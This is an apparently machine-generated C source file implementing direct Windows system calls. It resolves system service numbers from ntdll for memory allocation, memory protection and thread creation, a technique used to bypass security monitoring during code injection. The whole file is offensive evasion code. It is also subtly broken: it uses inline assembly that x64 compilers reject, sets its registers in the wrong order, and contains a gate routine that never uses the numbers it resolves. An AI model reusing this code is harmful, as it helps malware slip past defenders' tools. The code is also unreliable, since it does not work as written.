// Direct Syscall Implementation - Generation ID: 229188
#include <windows.h>
#include <winternl.h>

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;        // System Service Number
    PVOID address;    // Syscall address
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

DWORD syscall40517Resolve(LPCSTR functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    FARPROC funcAddr = GetProcAddress(ntdll, functionName);
    if (!funcAddr) return 0;
    
    // Extract SSN from function stub
    BYTE* stub = (BYTE*)funcAddr;
    
    // Pattern: mov eax, syscall_number
    if (stub[0] == 0xB8) {
        return *(DWORD*)(stub + 1);
    }
    
    // Pattern: mov r10, rcx; mov eax, syscall_number
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }
    
    return 0;
}

NTSTATUS syscall40517Execute(DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4) {
    // Assembly stub for direct syscall
    __asm {
        mov r10, rcx        // Move first arg to r10
        mov eax, ssn        // Move syscall number to eax
        mov rcx, arg1       // First argument
        mov rdx, arg2       // Second argument  
        mov r8, arg3        // Third argument
        mov r9, arg4        // Fourth argument
        syscall             // Execute syscall
        ret                 // Return
    }
}

NTSTATUS stub38361Gate() {
    static SYSCALL_ENTRY syscalls[] = {
        { 0, NULL },  // NtAllocateVirtualMemory
        { 0, NULL },  // NtProtectVirtualMemory
        { 0, NULL },  // NtCreateThreadEx
        { 0, NULL },  // NtResumeThread
    };
    
    static bool initialized = false;
    if (!initialized) {
        syscalls[0].ssn = syscall40517Resolve("NtAllocateVirtualMemory");
        syscalls[1].ssn = syscall40517Resolve("NtProtectVirtualMemory");
        syscalls[2].ssn = syscall40517Resolve("NtCreateThreadEx");
        syscalls[3].ssn = syscall40517Resolve("NtResumeThread");
        initialized = true;
    }
    
    return STATUS_SUCCESS;
}

